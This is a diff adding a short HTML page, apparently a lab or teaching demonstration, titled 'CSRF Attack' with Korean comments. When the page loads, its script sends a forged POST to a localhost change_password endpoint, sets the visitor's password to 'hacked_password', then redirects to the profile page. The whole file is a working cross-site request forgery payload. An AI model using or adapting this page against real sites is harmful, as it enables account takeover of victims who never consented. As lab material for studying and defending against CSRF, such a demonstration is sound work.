@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Malicious Page</h1>
+    <p>Your password is being changed without your consent...</p>
+
+    <script>
+        // AJAX를 통해 비동기적으로 비밀번호 변경 요청을 전송
+        fetch("http://localhost:5000/change_password", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: new URLSearchParams({
+                "new_password": "hacked_password"
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                // 비밀번호 변경 요청 완료 후 2초 뒤에 리디렉션
+                setTimeout(function() {
+                    window.location.href = "http://localhost:5000/profile";
+                }, 2000);
+            } else {
+                console.error("Password change failed.");
+            }
+        })
+        .catch(error => console.error("Error:", error));
+    </script>
+</body>
+</html>
